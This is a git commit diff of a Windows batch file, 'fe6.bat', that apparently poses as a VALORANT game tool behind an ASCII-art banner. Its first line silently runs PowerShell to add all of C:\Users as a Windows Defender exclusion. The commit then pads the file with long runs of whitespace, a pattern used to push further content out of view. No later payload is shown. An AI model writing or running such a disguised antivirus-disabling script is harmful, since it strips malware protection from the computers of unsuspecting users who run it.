5f6e1da427a7ba8b16d0b96740063c259e5be6c7
Fevzi Eser <59337397+seition2@users.noreply.github.com>
2022-03-08 14:03:04 +0300

    Update fe6.bat

--- fe6.bat
+++ fe6.bat
@@ -1,1 +1,12 @@
 powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\Users"
+
+
+@echo __    __ __    __     __    __    __    _   __ _____
+@echo ^| ^|  ^/ ^/   ^|  ^/ ^/   ^/ __ \^/ __ \^/   ^|  ^/ ^| ^/ ^/_  __^/
+@echo ^| ^| ^/ ^/ ^/^| ^| ^/ ^/   ^/ ^/ ^/ ^/ ^/_^/ ^/ ^/^| ^| ^/  ^|^/ ^/ ^/ ^/  
+@echo ^| ^|^/ ^/ ___ ^|^/ ^/___^/ ^/_^/ ^/ _, _^/ ___ ^|^/ ^/^|  ^/ ^/ ^/    
+@echo ^|___^/_^/  ^|_^/_____^/\____^/_^/ ^|_^/_^/  ^|_^/_^/ ^|_^/ ^/_^/     
+
+                                                                                                                                                                                                                   
+                                                                                                                                                   
+
